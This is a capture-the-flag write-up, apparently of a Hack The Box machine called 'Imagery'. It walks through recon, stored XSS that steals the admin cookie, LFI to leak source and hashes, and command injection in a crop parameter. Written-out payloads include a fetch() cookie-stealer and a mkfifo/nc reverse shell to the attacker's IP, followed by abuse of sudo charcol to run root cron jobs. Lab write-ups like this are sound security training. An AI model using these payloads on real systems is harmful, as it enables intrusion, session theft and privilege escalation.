
## Intro

![](MediaFiles/Pasted%20image%2020251001202232.png)

Tags: #linux #WebApp #XSS #LFI #codereview #commandinjection  #cronjob #medium
Tools used:
- wfuzz (fuzzing url parameters for LFI)
- BurpSuite (understanding and exploiting the webapp)
- dpyAesCrypt.py (Decrypting .aes file)

---
# Reconnaissance

## Nmap scan

```bash
sudo nmap -sC -sV imagery.htb
```

```bash
tarting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-01 06:18 CDT
Nmap scan report for imagery.htb (10.129.161.167)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Wed, 01 Oct 2025 11:19:18 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Wed, 01 Oct 2025 11:19:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 146960
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Image Gallery</title>
|     <script src="static/tailwind.js"></script>
|     <link rel="stylesheet" href="static/fonts.css">
|     <script src="static/purify.min.js"></script>
|     <style>
|     body {
|     font-family: 'Inter', sans-serif;
|     margin: 0;
|     padding: 0;
|     box-sizing: border-box;
|     display: flex;
|     flex-direction: column;
|     min-height: 100vh;
|     position: fixed;
|     top: 0;
|     width: 100%;
|     z-index: 50;
|_    #app-con
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
.......
.......
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.25 seconds
```
Only port 22 and 8000 open, lets proceed

### Directory and files enumeration

```bash

```

### Subdomain enumeration

```bash

```

## Inspecting the webapp

The webpage `http://imagery.htb:8000/` goes here:
![](MediaFiles/Pasted%20image%2020251001151556.png)

The `login` page:
![](MediaFiles/Pasted%20image%2020251001151844.png)
Nothing interesting found offensive-wise (no sql injection possible)

The `register` page:
![](MediaFiles/Pasted%20image%2020251001151910.png)
Nothing interesting found offensive-wise (no sql injection possible)

The `report a Bug` page
![](MediaFiles/Pasted%20image%2020251001160307.png)
```bash
.eJyrVkrJLC7ISaz0TFGyUjJJSU1OMjNIUtJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHckZxsnZuRYO6bmJmTl6yfm5SrUAZEUv4Q.aN0mSw.oKV1oSu3tdNKA9aY6-_N9B8Oa6Y
```

```shell
.eJyrVkrJLC7ISaz0TFGyUjI2SjMxsUgzU9JRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHckZxsnZuRYO6bmJmTl6yfm5SrUAKLsvXg.aRNxkw.YTpYgshGmVqGABssXakTv7DJN80
```

The `upload` page
![](MediaFiles/Pasted%20image%2020251001160956.png)

we can also view the image gallery
![](MediaFiles/Pasted%20image%2020251001160815.png)

By hitting download we get sth else as the filename of the image, that  id-like
![](MediaFiles/Pasted%20image%2020251001161100.png)

----
# Foothold

Lets start by checking for common web related vulnerabilities, i found that page `report a bug` is vulnerable to `xss`.
### Leaking admin's session cookie

#### XSS

- xss on bug report with bug detail to steal admin cookies
```bash
<img src=x onerror=fetch('http://10.10.14.80:8000/?c='+btoa(document.cookie))>

<img src=x onerror=fetch('http://10.10.14.225:1234/?c='+btoa(document.cookie))>
```
on my machine
```bash
python3 -m http.server 8000
```

got admin cookie:
![](MediaFiles/Pasted%20image%2020251001170120.png)
```bash
10.129.161.167 - - [01/Oct/2025 09:00:55] "GET /?c=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFOMDBKQS43RkswaFRfZENDQjg0ejlqOGVXcWdXeldINTQ=
```

```shell
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.129.242.164 - - [11/Nov/2025 11:34:11] "GET /?c=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFSTnpqdy51eTRKYjdqdGpld290aHhOaFpnejlJZno2S2c= 
```

frombase64:
```bash
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aN00JA.7FK0hT_dCCB84z9j8eWqgWzWH54
```

```shell
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRNzjw.uy4Jb7jtjewothxNhZgz9Ifz6Kg
```
##### webapp login as admin

now to login as admin went to console, on application,then cookies, edited the replaced the value of the cookie, and refreshed the page:
![](MediaFiles/Pasted%20image%2020251001170804.png)
we get this information on the page, does not appear usefull for now, i'll keep it in mind for later
```bash
Email ID: admin@imagery.htb (Admin)
ID: a1b2c3d4

Email ID: testuser@imagery.htb
ID: e5f6g7h8
```
Also by downloading logs nothing usefull was obtained, only timestamps of successful logins.
So the admin panel does not provide anything of value, we must find other ways to move forward.

### LFI

I then found the page to be vulnerable to lfi
```bash
wfuzz -c -z file,paths.txt -u 'http://imagery.htb:8000/admin/get_system_log?log_identifier=FUZZ' -H 'Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aN02uQ.ttj0EURW35LifzT2bhs6ePyZfPY' --hc 404
```
with fuzzing i found multiple interesting app related paths

#### Leaking webapp related files

I leaked those files
```bash
http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json
http://imagery.htb:8000/admin/get_system_log?log_identifier=../app.py
http://imagery.htb:8000/admin/get_system_log?log_identifier=../api_edit.py
```

- `db.json` should be downloaded, its contents are:
![](MediaFiles/Pasted%20image%2020251001172402.png)
```bash
username	"admin@imagery.htb"
password	"5d9c1d507a3f76af1e5c97a3ad1eaa31"

username	"testuser@imagery.htb"
password	"2c65c8d7bfbca32a3ed42596192384f6"
```
[TODO] explain further HOW TO MOVE ONE FROM HERE?

- also leaked `app.py`
```python
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)
```

- `api_edit.py`
```python
from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

@bp_edit.route('/convert_image', methods=['POST'])
def convert_image():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    target_format = request_payload.get('targetFormat')
    if not image_id or not target_format:
        return jsonify({'success': False, 'message': 'Image ID and target format are required.'}), 400
    if target_format.lower() not in ALLOWED_MEDIA_EXTENSIONS:
        return jsonify({'success': False, 'message': 'Target format not allowed.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to convert.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    current_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if target_format.lower() == current_ext:
        return jsonify({'success': False, 'message': f'Image is already in {target_format.upper()} format.'}), 400
    try:
        unique_output_filename = f"converted_{uuid.uuid4()}.{target_format.lower()}"
        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, output_filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        new_file_md5 = _calculate_file_md5(output_filepath)
        if new_file_md5 is None:
            os.remove(output_filepath)
            return jsonify({'success': False, 'message': 'Failed to calculate MD5 hash for new file.'}), 500
        for img_entry in application_data['images']:
            if img_entry.get('type') == 'converted' and img_entry.get('original_id') == original_image['id']:
                existing_converted_filepath = os.path.join(UPLOAD_FOLDER, img_entry['filename'])
                existing_file_md5 = img_entry.get('md5_hash')
                if existing_file_md5 is None:
                    existing_file_md5 = _calculate_file_md5(existing_converted_filepath)
                if existing_file_md5:
                    img_entry['md5_hash'] = existing_file_md5
                    _save_data(application_data)
                if existing_file_md5 == new_file_md5:
                    os.remove(output_filepath)
                    return jsonify({'success': False, 'message': 'An identical converted image already exists.'}), 409
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Converted: {original_image['title']} to {target_format.upper()}",
            'description': f"Converted from {original_image['filename']} to {target_format.upper()}.",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Converted',
            'type': 'converted',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath),
            'md5_hash': new_file_md5
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Converted' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Converted'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image converted successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        if os.path.exists(output_filepath):
            os.remove(output_filepath)
        return jsonify({'success': False, 'message': f'Image conversion failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during conversion: {str(e)}'}), 500

@bp_edit.route('/delete_image_metadata', methods=['POST'])
def delete_image_metadata():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    if not image_id:
        return jsonify({'success': False, 'message': 'Image ID is required.'}), 400
    application_data = _load_data()
    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not image_entry:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to modify.'}), 404
    filepath = os.path.join(UPLOAD_FOLDER, image_entry['filename'])
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'message': 'Image file not found on server.'}), 404
    try:
        command = [EXIFTOOL_PATH, '-all=', '-overwrite_original', filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Metadata deleted successfully from image!'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Failed to delete metadata: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500
```

### Command injection

According to the above output of `api_edit.py`, the crop operation allows for command injection due to `shell=True`, because of this snippet:
![](MediaFiles/Pasted%20image%2020251001174849.png)
but when i uploaded an image as admin, i say transform image being greyed out and not clickable... why?

#### webapp login as testuser

somehow testuser can transform image , why? admin couldn't
found those creds, [TODO] explain further? 
```bash
testuser@
iambatman
```

Then followed the steps below:
1. upload image
2. then we can see that transform image is clickable
3. open burp and intercept
![](MediaFiles/Pasted%20image%2020251001175839.png)
4. send the request to repeater
5. then edit the request so it contains the payload containing the bindshell
```bash
"params":{"x":"`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.80 9997 >/tmp/f`","y":0,"width":48,"height":48}}
```
6. start listener on your attacker machine
```bash
nc -nvlp 9997
```

#### Shell as web

![](MediaFiles/Pasted%20image%2020251001181815.png)
stabilize shell first
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

##### Enumerating directories and files 

After extensive search through files and directories, i found `web_20250806_120723.zip.aes` located on `/var/backup`.

Why did i choose this file? well first of all its encrypted, and it must be encrypted for a reason, and since its located on backup it might be a file containing important information.

##### File transfer from the target towards the attacker host

- Start a webserver inside the target
![](MediaFiles/Pasted%20image%2020251001182951.png)

- retrieve the file from our attacker machine
![](MediaFiles/Pasted%20image%2020251001183003.png)

### Decrypting the .aes file

this tool to decrypt https://github.com/Nabeelcn25/dpyAesCrypt.py 
```bash
password mark
supersmash
```
### Shell as mark

as user web change to user mark
```bash
su mark
```
insert pass for mark, grab user flag and proceed to privesc
![](MediaFiles/Pasted%20image%2020251001200823.png)
grabbed user flag `a025b53f72a44506a3c7d401e0dbcefa`

-----
# Privesc

Lets start with `sudo -l`

```bash
mark@Imagery:~$ sudo -l
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
mark@Imagery:~$ 
```

### What is charcol?

[TODO] explain, related to scheduling a job to run ++

### Scheduling a task with root privileges via charcol  

Found this privesc path
```bash
sudo /usr/local/bin/charcol -R

sudo -u root /usr/local/bin/charcol shell
# without password 
# hit enter 
# then yes

# then again write
sudo -u root /usr/local/bin/charcol shell

# once inside charcol, write
auto add --schedule "*/1 * * * *" --command "cat /root/root.txt >> /tmp/flag.txt" --name "TestTimestamp" --log-output /tmp/root.txt wait 1 min

# then exit charcol and once out of charcol grab the root flag
cat /tmp/root.txt
```
proof:
![](MediaFiles/Pasted%20image%2020251001191803.png)

![](MediaFiles/Pasted%20image%2020251001190536.png)
grabbed root flag `6b3bd4c6e4161fb105e73aa1cd442d08`
pwned!

### Why did this work?

`charcol` is able to perform actions as root (you invoked it with `sudo`), and it exposes a scheduling feature that will execute arbitrary commands with root privileges. By instructing it to `cat /root/root.txt` and write the result to `/tmp/flag.txt`, you cause the privileged process to place root-owned content in a world-readable temp file.

To conclude we used a root-capable scheduler (`charcol`) to create a job that runs every minute as root and copies `/root/root.txt` into a `/tmp` file you can read; after waiting a minute and exiting the scheduler you `cat` the output file to read the root flag.

-----
# Summary 




------
# Sidenotes


A machine featuring important principles of webapp exploitation

![](MediaFiles/Pasted%20image%2020251001192137.png)